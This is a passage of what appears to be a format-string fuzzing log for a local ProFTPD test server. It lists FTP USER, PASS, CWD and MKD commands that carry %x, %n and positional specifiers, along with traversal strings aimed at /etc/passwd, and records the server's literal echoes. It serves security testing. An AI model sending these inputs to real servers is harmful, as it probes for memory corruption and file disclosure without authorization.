@@ -1,0 +1,3606 @@
+{
+  "fuzzer": "format_string",
+  "target": "ProFTPD 1.3.9 at 127.0.0.1:21",
+  "start_time": "2026-02-13T23:02:26.133057",
+  "test_cases": [
+    {
+      "id": 1,
+      "category": "format_string_USER_preauth",
+      "command": "USER %x",
+      "response": "331 Password required for %x\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 2,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS %x",
+      "response": "530 Login incorrect.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 3,
+      "category": "format_string_USER_preauth",
+      "command": "USER %s",
+      "response": "331 Password required for %s\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 4,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS %s",
+      "response": "530 Login incorrect.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 5,
+      "category": "format_string_USER_preauth",
+      "command": "USER %n",
+      "response": "331 Password required for %n\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 6,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS %n",
+      "response": "530 Login incorrect.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 7,
+      "category": "format_string_USER_preauth",
+      "command": "USER %d",
+      "response": "331 Password required for %d\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 8,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS %d",
+      "response": "530 Login incorrect.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 9,
+      "category": "format_string_USER_preauth",
+      "command": "USER %p",
+      "response": "331 Password required for %p\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 10,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS %p",
+      "response": "530 Login incorrect.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 11,
+      "category": "format_string_USER_preauth",
+      "command": "USER %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "331 Password required for %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 12,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "530 Login incorrect.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 13,
+      "category": "format_string_USER_preauth",
+      "command": "USER %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "331 Password required for %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 14,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "530 Login incorrect.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 15,
+      "category": "format_string_USER_preauth",
+      "command": "USER %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p",
+      "response": "331 Password required for %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 16,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p",
+      "response": "530 Login incorrect.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 17,
+      "category": "format_string_USER_preauth",
+      "command": "USER %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "331 Password required for %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 18,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "530 Login incorrect.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 19,
+      "category": "format_string_USER_preauth",
+      "command": "USER %n%n%n%n",
+      "response": "331 Password required for %n%n%n%n\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 20,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS %n%n%n%n",
+      "response": "530 Login incorrect.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 21,
+      "category": "format_string_USER_preauth",
+      "command": "USER %hn%hn%hn%hn",
+      "response": "331 Password required for %hn%hn%hn%hn\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 22,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS %hn%hn%hn%hn",
+      "response": "530 Login incorrect.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 23,
+      "category": "format_string_USER_preauth",
+      "command": "USER %hhn%hhn%hhn%hhn",
+      "response": "331 Password required for %hhn%hhn%hhn%hhn\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 24,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS %hhn%hhn%hhn%hhn",
+      "response": "530 Login incorrect.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 25,
+      "category": "format_string_USER_preauth",
+      "command": "USER %1$x",
+      "response": "331 Password required for %1$x\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 26,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS %1$x",
+      "response": "530 Login incorrect.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 27,
+      "category": "format_string_USER_preauth",
+      "command": "USER %2$x",
+      "response": "331 Password required for %2$x\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 28,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS %2$x",
+      "response": "530 Login incorrect.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 29,
+      "category": "format_string_USER_preauth",
+      "command": "USER %3$x",
+      "response": "331 Password required for %3$x\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 30,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS %3$x",
+      "response": "530 Login incorrect.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 31,
+      "category": "format_string_USER_preauth",
+      "command": "USER %10$x",
+      "response": "331 Password required for %10$x\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 32,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS %10$x",
+      "response": "530 Login incorrect.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 33,
+      "category": "format_string_USER_preauth",
+      "command": "USER %100$x",
+      "response": "331 Password required for %100$x\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 34,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS %100$x",
+      "response": "530 Login incorrect.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 35,
+      "category": "format_string_USER_preauth",
+      "command": "USER %1$s",
+      "response": "331 Password required for %1$s\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 36,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS %1$s",
+      "response": "530 Login incorrect.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 37,
+      "category": "format_string_USER_preauth",
+      "command": "USER %2$s",
+      "response": "331 Password required for %2$s\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 38,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS %2$s",
+      "response": "530 Login incorrect.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 39,
+      "category": "format_string_USER_preauth",
+      "command": "USER %3$s",
+      "response": "331 Password required for %3$s\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 40,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS %3$s",
+      "response": "530 Login incorrect.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 41,
+      "category": "format_string_USER_preauth",
+      "command": "USER %1$n",
+      "response": "331 Password required for %1$n\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 42,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS %1$n",
+      "response": "530 Login incorrect.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 43,
+      "category": "format_string_USER_preauth",
+      "command": "USER %2$n",
+      "response": "331 Password required for %2$n\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 44,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS %2$n",
+      "response": "530 Login incorrect.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 45,
+      "category": "format_string_USER_preauth",
+      "command": "USER AAAA%x%x%x%x",
+      "response": "331 Password required for AAAA%x%x%x%x\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 46,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS AAAA%x%x%x%x",
+      "response": "530 Login incorrect.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 47,
+      "category": "format_string_USER_preauth",
+      "command": "USER AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "331 Password required for AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 48,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "530 Login incorrect.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 49,
+      "category": "format_string_USER_preauth",
+      "command": "USER %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "501 Login incorrect.\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 50,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "503 Login with USER first\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 51,
+      "category": "format_string_USER_preauth",
+      "command": "USER %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "331 Password required for %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 52,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "530 Login incorrect.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 53,
+      "category": "format_string_USER_preauth",
+      "command": "USER ../%x%x%x%x",
+      "response": "331 Password required for ../%x%x%x%x\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 54,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS ../%x%x%x%x",
+      "response": "530 Login incorrect.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 55,
+      "category": "format_string_USER_preauth",
+      "command": "USER %x/../../../etc/passwd",
+      "response": "331 Password required for %x/../../../etc/passwd\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 56,
+      "category": "format_string_PASS_preauth",
+      "command": "PASS %x/../../../etc/passwd",
+      "response": "530 Login incorrect.\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 57,
+      "category": "format_string_CWD",
+      "command": "CWD %x",
+      "response": "550 %x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 58,
+      "category": "format_string_CWD",
+      "command": "CWD %s",
+      "response": "550 %s: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 59,
+      "category": "format_string_CWD",
+      "command": "CWD %n",
+      "response": "550 %n: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 60,
+      "category": "format_string_CWD",
+      "command": "CWD %d",
+      "response": "550 %d: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 61,
+      "category": "format_string_CWD",
+      "command": "CWD %p",
+      "response": "550 %p: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 62,
+      "category": "format_string_CWD",
+      "command": "CWD %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "550 %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 63,
+      "category": "format_string_CWD",
+      "command": "CWD %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "550 %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 64,
+      "category": "format_string_CWD",
+      "command": "CWD %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p",
+      "response": "550 %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 65,
+      "category": "format_string_CWD",
+      "command": "CWD %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "550 %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 66,
+      "category": "format_string_CWD",
+      "command": "CWD %n%n%n%n",
+      "response": "550 %n%n%n%n: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 67,
+      "category": "format_string_CWD",
+      "command": "CWD %hn%hn%hn%hn",
+      "response": "550 %hn%hn%hn%hn: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 68,
+      "category": "format_string_CWD",
+      "command": "CWD %hhn%hhn%hhn%hhn",
+      "response": "550 %hhn%hhn%hhn%hhn: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 69,
+      "category": "format_string_CWD",
+      "command": "CWD %1$x",
+      "response": "550 %1$x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 70,
+      "category": "format_string_CWD",
+      "command": "CWD %2$x",
+      "response": "550 %2$x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 71,
+      "category": "format_string_CWD",
+      "command": "CWD %3$x",
+      "response": "550 %3$x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 72,
+      "category": "format_string_CWD",
+      "command": "CWD %10$x",
+      "response": "550 %10$x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 73,
+      "category": "format_string_CWD",
+      "command": "CWD %100$x",
+      "response": "550 %100$x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 74,
+      "category": "format_string_CWD",
+      "command": "CWD %1$s",
+      "response": "550 %1$s: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 75,
+      "category": "format_string_CWD",
+      "command": "CWD %2$s",
+      "response": "550 %2$s: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 76,
+      "category": "format_string_CWD",
+      "command": "CWD %3$s",
+      "response": "550 %3$s: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 77,
+      "category": "format_string_CWD",
+      "command": "CWD %1$n",
+      "response": "550 %1$n: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 78,
+      "category": "format_string_CWD",
+      "command": "CWD %2$n",
+      "response": "550 %2$n: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 79,
+      "category": "format_string_CWD",
+      "command": "CWD AAAA%x%x%x%x",
+      "response": "550 AAAA%x%x%x%x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 80,
+      "category": "format_string_CWD",
+      "command": "CWD AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "550 AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 81,
+      "category": "format_string_CWD",
+      "command": "CWD %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "550 %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 82,
+      "category": "format_string_CWD",
+      "command": "CWD %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "550 %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 83,
+      "category": "format_string_CWD",
+      "command": "CWD ../%x%x%x%x",
+      "response": "550 ../%x%x%x%x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 84,
+      "category": "format_string_CWD",
+      "command": "CWD %x/../../../etc/passwd",
+      "response": "550 %x/../../../etc/passwd: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 85,
+      "category": "format_string_MKD",
+      "command": "MKD %x",
+      "response": "257 \"/home/ftptest/%x\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 86,
+      "category": "format_string_MKD",
+      "command": "MKD %s",
+      "response": "257 \"/home/ftptest/%s\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 87,
+      "category": "format_string_MKD",
+      "command": "MKD %n",
+      "response": "257 \"/home/ftptest/%n\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 88,
+      "category": "format_string_MKD",
+      "command": "MKD %d",
+      "response": "257 \"/home/ftptest/%d\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 89,
+      "category": "format_string_MKD",
+      "command": "MKD %p",
+      "response": "257 \"/home/ftptest/%p\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 90,
+      "category": "format_string_MKD",
+      "command": "MKD %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "257 \"/home/ftptest/%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 91,
+      "category": "format_string_MKD",
+      "command": "MKD %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "257 \"/home/ftptest/%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 92,
+      "category": "format_string_MKD",
+      "command": "MKD %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p",
+      "response": "257 \"/home/ftptest/%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 93,
+      "category": "format_string_MKD",
+      "command": "MKD %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "257 \"/home/ftptest/%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 94,
+      "category": "format_string_MKD",
+      "command": "MKD %n%n%n%n",
+      "response": "257 \"/home/ftptest/%n%n%n%n\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 95,
+      "category": "format_string_MKD",
+      "command": "MKD %hn%hn%hn%hn",
+      "response": "257 \"/home/ftptest/%hn%hn%hn%hn\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 96,
+      "category": "format_string_MKD",
+      "command": "MKD %hhn%hhn%hhn%hhn",
+      "response": "257 \"/home/ftptest/%hhn%hhn%hhn%hhn\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 97,
+      "category": "format_string_MKD",
+      "command": "MKD %1$x",
+      "response": "257 \"/home/ftptest/%1$x\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 98,
+      "category": "format_string_MKD",
+      "command": "MKD %2$x",
+      "response": "257 \"/home/ftptest/%2$x\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 99,
+      "category": "format_string_MKD",
+      "command": "MKD %3$x",
+      "response": "257 \"/home/ftptest/%3$x\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 100,
+      "category": "format_string_MKD",
+      "command": "MKD %10$x",
+      "response": "257 \"/home/ftptest/%10$x\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 101,
+      "category": "format_string_MKD",
+      "command": "MKD %100$x",
+      "response": "257 \"/home/ftptest/%100$x\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 102,
+      "category": "format_string_MKD",
+      "command": "MKD %1$s",
+      "response": "257 \"/home/ftptest/%1$s\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 103,
+      "category": "format_string_MKD",
+      "command": "MKD %2$s",
+      "response": "257 \"/home/ftptest/%2$s\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 104,
+      "category": "format_string_MKD",
+      "command": "MKD %3$s",
+      "response": "257 \"/home/ftptest/%3$s\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 105,
+      "category": "format_string_MKD",
+      "command": "MKD %1$n",
